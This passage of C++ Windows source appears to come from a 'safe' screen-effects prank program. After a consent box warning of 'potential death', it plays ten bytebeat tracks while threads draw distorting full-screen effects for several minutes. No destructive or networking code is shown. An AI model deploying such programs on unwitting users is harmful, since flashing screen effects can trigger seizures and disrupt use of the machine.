		buffer[t] = static_cast<char>((t & t >> 9) ^ t >> 8) * tan(t >> 3) * (t >> 7);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t >> 32) * (t >> 9) ^ (t >> 9)) | ((t << 3) * t ^ (t / (1 | 2)));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(((t << (t >> 9 & t)) + (t << (t >> 114)) + (t >> (t >> 10 & t))));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t + (t | t ^ t >> 8) - t * (t >> 9 & (t % 16 ? 2 : 6) & t >> 9));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 4 ^ t * t * (t >> 6 * 8 ^ 8) * (t >> 11 ^ t * 3 >> 12) * (7 + (t >> 10 * t >> 6 & 3)));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 5 | t & t >> 9 | t >> 13) - t);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t ^ (t * 4096 ? t * t >> 12 : t >> 12)) | t << (t >> 7) ^ t >> 8);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound8() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(9 * t & t >> 4 | 5 * t ^ t >> 7 | (3 * t * t >> 10) - 5);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound9() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(9 * t & t >> 4 | 78 * t ^ t >> 7 | (7 * t * t >> 10) - 5);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound10() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t | t / 2 & t / 4) * t / 4E3);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
)
{
	if (MessageBoxW(NULL, L"By pressing Yes, You agree that you are the one responsible for potential death of yourself or your friends.", L"amethyst agreement (SAFE)", MB_YESNO | MB_SYSTEMMODAL) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		Sleep(5000);
		CreateThread(0, 0, texts, 0, 0, 0);
		HANDLE thread0 = CreateThread(0, 0, shader0, 0, 0, 0);
		Sleep(10000);
		TerminateThread(thread0, 0);
		CloseHandle(thread0);
		InvalidateRect(0, 0, 0);
		HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
		HANDLE thread1dot1 = CreateThread(0, 0, Sines1, 0, 0, 0);
		sound1();
		Sleep(30000);
		TerminateThread(thread1, 0);
		CloseHandle(thread1);
		TerminateThread(thread1dot1, 0);
		CloseHandle(thread1dot1);
		InvalidateRect(0, 0, 0);
		HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
		HANDLE thread2dot1 = CreateThread(0, 0, mess, 0, 0, 0);
		sound2();
		Sleep(30000);
		TerminateThread(thread2, 0);
		CloseHandle(thread2);
		InvalidateRect(0, 0, 0);
		HANDLE thread3 = CreateThread(0, 0, shader3, 0, 0, 0);
		sound3();
		Sleep(30000);
		TerminateThread(thread3, 0);
		CloseHandle(thread3);
		InvalidateRect(0, 0, 0);
		HANDLE thread4 = CreateThread(0, 0, shader4, 0, 0, 0);
		HANDLE thread4dot1 = CreateThread(0, 0, bounce, 0, 0, 0);
		HANDLE thread4dot2 = CreateThread(0, 0, textout1, 0, 0, 0);
		sound4();
		Sleep(30000);
		TerminateThread(thread4, 0);
		CloseHandle(thread4);
		TerminateThread(thread4dot1, 0);
		CloseHandle(thread4dot1);
		InvalidateRect(0, 0, 0);
		HANDLE thread5 = CreateThread(0, 0, shader5, 0, 0, 0);
		sound5();
		Sleep(30000);
		TerminateThread(thread5, 0);
		CloseHandle(thread5);
		InvalidateRect(0, 0, 0);
		HANDLE thread6 = CreateThread(0, 0, shader6, 0, 0, 0);
		HANDLE thread6dot1 = CreateThread(0, 0, bez, 0, 0, 0);
		sound6();
		Sleep(30000);
		TerminateThread(thread6, 0);
		CloseHandle(thread6);
		InvalidateRect(0, 0, 0);
		HANDLE thread7 = CreateThread(0, 0, shader7, 0, 0, 0);
		sound7();
		Sleep(30000);
		TerminateThread(thread7, 0);
		CloseHandle(thread7);
		TerminateThread(thread4dot2, 0);
		CloseHandle(thread4dot2);
		TerminateThread(thread6dot1, 0);
		CloseHandle(thread6dot1);
		InvalidateRect(0, 0, 0);
		HANDLE thread8 = CreateThread(0, 0, wow, 0, 0, 0);
		sound8();
		Sleep(30000);
		InvalidateRect(0, 0, 0);
		HANDLE thread9 = CreateThread(0, 0, shader8, 0, 0, 0);
		sound9();
		Sleep(30000);
		InvalidateRect(0, 0, 0);
		HANDLE thread10 = CreateThread(0, 0, shader9, 0, 0, 0);
		HANDLE thread10dot1 = CreateThread(0, 0, rotation, 0, 0, 0);
		sound10();
		Sleep(30000);
		TerminateThread(thread10, 0);
		CloseHandle(thread10);
		TerminateThread(thread8, 0);
		CloseHandle(thread8);
		TerminateThread(thread9, 0);
		CloseHandle(thread9);
		TerminateThread(thread2dot1, 0);
		CloseHandle(thread2dot1);
		TerminateThread(thread10dot1, 0);
		CloseHandle(thread10dot1);
		TerminateThread(thread2dot1, 0);
		CloseHandle(thread2dot1);
		InvalidateRect(0, 0, 0);
	}
}